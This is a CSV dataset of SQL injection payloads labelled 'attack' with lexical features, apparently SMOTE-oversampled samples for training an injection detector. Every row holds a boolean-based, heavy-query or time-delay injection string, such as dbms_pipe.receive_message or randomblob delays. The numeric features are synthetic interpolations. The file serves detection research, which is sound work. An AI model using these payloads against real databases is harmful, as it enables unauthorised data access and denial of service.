id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000134,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,1.663260503257045,82.3207189089426,25.31131080803961,3.6363856977761655,22.386786484823766,14.386786484823768,32.62262161607922,12.924524323215843,0.2731914075777268,0.17486087750597898,0.3944027423824133,0.15754497253388092,4.0,0.0,0.46226216160792216,0.0,0.0,1.537737838392078,0.0,4.924524323215844,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.537737838392078,0.4622621616079223,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000017,0.21112473513745156,162.07670231553294,33.83275672308982,4.073693283456937,80.91291870008385,16.0,48.33102689235929,16.832756723089823,0.4991104081015416,0.09889174723021418,0.29811148576741947,0.1038863589008247,0.0,0.9163783615449113,2.0,0.0,1.0,2.0,0.0,5.916378361544911,0.0,0.0,2.0,5.0,0.0,0.9163783615449113,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000136,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000061,0.4501893304792415,121.90230502900796,28.629404036936766,4.0919371627358085,80.75528484432412,3.7552848443241196,24.762331303422947,12.629404036936767,0.6652792179109095,0.029826908004960892,0.20163815710025737,0.10325571698387233,3.1258808073873534,0.0,0.0,0.0,1.0,1.0,0.0,2.251761614774707,0.0,0.0,2.1258808073873534,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.12588080738735347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1258808073873534
SMOTE_000137,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,2.3314275399136513,136.06035805840693,35.06035805840693,3.800775057400579,43.0,19.12071611681387,54.96982097079653,18.969820970796533,0.3161045102470529,0.14012927691850285,0.4042059246601745,0.13956028817426977,2.0,2.454731456194799,1.0301790292034676,1.0,0.0,2.0,0.0,9.484910485398267,0.0,0.0,1.0,4.030179029203468,1.0,1.0,0.5150895146017337,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5150895146017338,0.0,1.4849104853982662,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,0.8583725180963688,163.85087830873502,35.68083679297962,3.942854954294214,49.40418396489808,24.0,61.24460236138789,29.20209198244904,0.30120339169841515,0.1470313095485563,0.37359523236346664,0.1781700663895619,3.361673585959233,0.15958160351019157,0.31916320702038337,0.0,0.0,2.0,0.0,11.680836792979616,0.0,2.0,1.0,10.0,0.8404183964898084,0.1595816035101917,0.15958160351019163,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.8404183964898082,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.840418396489808
SMOTE_000139,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000020,0.2708498531722544,113.82749376931963,28.94249792310654,4.157680148620772,71.11500415378691,4.884995846213084,22.05750207689346,15.769991692426167,0.6248110017314695,0.04289173839273694,0.19380040886998753,0.13849685100580597,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,0.0,4.712489615532708,3.884995846213083,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,0.14347561780746948,153.2616732662202,34.82961690758928,4.30352078252431,75.60243945104165,16.943205635863094,42.88641127172619,17.82961690758928,0.4932710927156525,0.1105648532005698,0.2798772858707913,0.11628676821298634,0.9432056358630936,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.9432056358630936,5.0,0.9432056358630936,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000141,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000058,1.373513663350537,128.7382900927553,33.0,3.616024190551495,36.2349444049711,15.0,56.0,21.503345687784197,0.28092232202830236,0.11657807313483784,0.4352248063700613,0.1672747984667985,5.006691375568399,0.9933086244316014,0.0,1.0,0.0,2.0,0.0,10.0,1.5033456877841993,0.0,1.0,3.0,1.0,0.24832715610790032,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2483271561079003,0.7516728438920997,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000037,1.348513942601056,137.79229039639165,32.28051397357389,3.4465443846037314,34.71948602642611,15.0,64.63383231711332,23.43897205285222,0.2524363342507929,0.10913361672696714,0.4682338051500199,0.17019624387222002,3.1220558942955616,2.877944105704439,0.0,1.0,0.0,2.0,0.0,11.438972052852218,2.0,0.0,1.0,3.0,1.0,0.7194860264261096,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7194860264261096,0.2805139735738904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000143,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,0.7360980719723178,81.48793453907362,23.585344243487732,3.204627923860535,17.207327878256134,12.207327878256134,39.65862302604908,12.41465575651227,0.21158492352454908,0.15002416023276552,0.48608842767743493,0.1523024885652505,0.0,4.0,0.7926721217438653,0.0,0.2073278782561349,1.0,0.0,6.4146557565122695,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2073278782561347,0.7926721217438653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,0.0002911408688305693,154.00024420832733,34.99975579167266,4.3134696280993206,76.00056981943045,16.99991859722422,43.0,17.999755791672662,0.4935093552965263,0.11038892019319071,0.2792203449020566,0.1168813796082264,0.9999185972242209,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.9999185972242213,5.0,0.999918597224221,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,8.14027757790603e-05,0.9999185972242209,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000145,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000060,0.2975989139675082,133.6885520009714,32.92213800024285,3.690469789252439,42.377104001942826,15.622895998057173,56.0,19.688552000971413,0.3168728013902737,0.11699998758467796,0.418911658320643,0.14721555270440534,2.0,3.6885520009714137,0.0,1.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.9221380002428534,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000146,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,0.4849381365935187,122.31234129000559,29.0,3.577869858500789,45.156170645002796,13.0,51.21644417035974,12.939726474643058,0.3686993834543086,0.10668175094337427,0.41856496388141107,0.10605390172090612,3.819179423929171,0.0,0.0,0.0,0.06027352535694297,1.0,0.0,7.939726474643057,0.0,0.06027352535694297,0.06027352535694308,1.0602735253569433,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9397264746430569,0.0,1.0,0.0,0.0,0.06027352535694297,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9397264746430569,0.9397264746430569,3.9397264746430567
SMOTE_000147,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000016,0.5614322471454783,72.74432554187302,26.0,3.823905010779001,13.999999999999996,24.0,24.0,10.744325541873028,0.19246184216396073,0.3299345865667898,0.3299345865667898,0.14766898470245962,0.0,0.7443255418730289,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.7443255418730289,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000148,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,1.2573976525727395,80.66288460973277,23.168557695133615,3.2241350199716683,15.337115390267229,13.662884609732771,38.831442304866385,12.831442304866385,0.1908438428344752,0.1688902346884392,0.4813930649557113,0.15887285752137428,0.0,4.0,1.0,0.0,0.41572115243319285,1.4157211524331927,0.0,6.0,0.0,0.0,0.0,2.8314423048663855,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000149,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000026,2.372961938542156,83.90905946042153,20.594398337020355,2.9090520540140163,6.594398337020358,16.0,44.25172889872094,17.062932224680235,0.07766571062748334,0.19184055535833414,0.5268428206038458,0.20365091341033675,2.125864449360472,1.874135550639528,1.0,0.0,0.46853388765988196,2.0,0.0,7.062932224680236,2.0,0.0,0.5314661123401181,3.468533887659882,0.531466112340118,0.468533887659882,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,0.8660350083678086,128.41761462362112,29.0,3.495275573266674,44.64073396196273,13.0,56.75743113313044,14.019449528527952,0.34908410281356295,0.10145814750959062,0.4405583647327453,0.1088993849441012,4.0,0.0,0.0,0.0,0.0,1.3398165095093173,0.0,8.679633019018635,0.0,0.0,0.0,1.3398165095093173,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000151,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,0.1734455142675891,155.39714424656177,30.222104751266723,3.8325433761006233,66.36541499638079,16.158646250904802,56.77789524873327,16.09518775054288,0.4267450905350817,0.1041734281862325,0.36537125382502206,0.10371022745366373,0.12691700072384204,0.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,0.03172925018096051,1.9682707498190395,3.063458500361921,0.03172925018096051,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0317292501809605,0.0,0.03172925018096068,1.0,1.0,0.9682707498190395,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.031729250180961
SMOTE_000152,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000017,0.08116166149505001,163.19227690011436,33.94230549286531,4.072834876002634,81.62498570362452,16.0,48.65383295719187,16.913458239297967,0.5002121121585834,0.09814040394539861,0.29800964117978224,0.10363784271623576,0.0,0.9711527464326555,2.0,0.0,1.0,2.0,0.0,5.942305492865311,0.0,0.0,2.0,5.0,0.0,0.9711527464326555,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000153,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,0.9754083134628369,73.61113080825078,24.347217297937306,3.5054568843290936,12.217594234020897,16.0,30.61113080825077,14.782405765979103,0.16631861885567187,0.21826266877108225,0.41341907767771646,0.2019996346955294,0.0,4.0,1.0,0.0,0.2175942340208975,2.0,0.0,4.435188468041795,1.564811531958205,0.7824057659791025,0.7824057659791025,3.2175942340208974,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000154,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,4.913544969911978,166.62070913467417,36.45976362177528,4.021489594183435,58.35621794840447,21.241418269348323,60.24141826934833,26.781654647573045,0.3506922240066222,0.1273326569270685,0.36141607481118493,0.16055904425512435,5.839054487101117,0.0,0.4597636217752792,0.0,0.0,1.5402363782247208,0.0,10.160945512898884,0.0,1.0804727564494416,0.5402363782247208,8.160945512898884,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.5402363782247208,0.45976362177527924,0.45976362177527913,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.45976362177527913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.45976362177527913,0.45976362177527913,4.839054487101117
SMOTE_000155,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000065,1.1114204899434197,90.79112038581687,22.60443980709157,3.1278118532499786,15.417759228366279,13.0,45.58224077163372,16.79112038581686,0.1707200202561856,0.14324548357020514,0.5014318641886231,0.18460263198498614,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.39556019290843,1.3955601929084303,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,0.4017097429186252,68.59201132421722,25.481597735156555,3.6764793895800643,12.0,16.0,26.073609059373783,14.518402264843445,0.17568595338475945,0.23424793784634598,0.37835371187657724,0.2117123968923173,0.0,4.0,1.0,0.0,0.0,2.0,0.0,3.5184022648434454,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,0.9059701626159896,125.75439592428778,27.39348513204111,3.4651672174124157,42.0,13.0,56.360910792246656,14.39348513204111,0.33459826545486404,0.1035661297836484,0.447430695361391,0.1144049094000966,0.78697026408222,3.2130297359177797,0.0,0.0,0.0,2.0,0.0,8.39348513204111,0.0,0.0,0.0,2.0,0.196742566020555,0.8032574339794449,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000158,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000034,0.949452081979987,129.18936099909763,32.398670124887204,3.7967742969642884,37.79734024977441,16.794015561992424,50.398670124887204,24.199335062443602,0.29267038422227604,0.1290076875600593,0.3907201199296281,0.18760180828803658,0.0,0.19933506244360277,2.0,0.0,0.0,1.1993350624436028,0.0,10.800664937556396,0.0,2.0,1.0,9.199335062443602,0.0,0.19933506244360277,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.19933506244360277,0.0,0.8006649375563972,0.19933506244360277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1993350624436028
SMOTE_000159,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,1.0212590309659224,115.44560944315265,33.18549585150737,3.872918294315048,38.074617740137896,21.0,42.77824377726105,13.592747925753685,0.32934653433446387,0.18251409993520623,0.37045009810572854,0.11768926762460136,0.2963739628768427,0.0,2.0,0.0,1.0,2.0,0.0,6.296373962876843,0.0,1.0,1.0,5.0,0.2963739628768428,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.2963739628768428,0.7036260371231572,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000160,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000045,0.008503532815896147,73.0,26.0,3.7769340764099084,13.999999999999996,24.0,24.0,11.0,0.1917808219178082,0.3287671232876712,0.3287671232876712,0.1506849315068493,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,1.1072763517693776,130.63899848195004,35.18135320906764,4.008462933746428,50.36782111839126,19.635588681779396,45.362706418135275,15.27288226364412,0.3817220849258212,0.15171857063954117,0.3494654279072812,0.11709391652735644,0.7271177363558793,0.2728822636441207,2.0,0.0,1.0,2.0,0.0,6.454235472711758,0.0,0.7271177363558793,1.2728822636441208,5.0,0.7271177363558793,0.2728822636441207,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000162,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,0.8326486177902002,137.3072741253905,36.30727412539051,3.863722955435833,43.0,21.614548250781013,54.34636293730475,18.346362937304747,0.31320501906814885,0.1571890738548452,0.39591203128796065,0.13369387578904532,2.0,1.5195444059571204,1.653637062695253,1.0,0.0,2.0,0.0,9.173181468652373,0.0,0.0,1.0,4.653637062695253,1.0,1.0,0.8268185313476266,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8268185313476264,0.0,1.1731814686523734,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
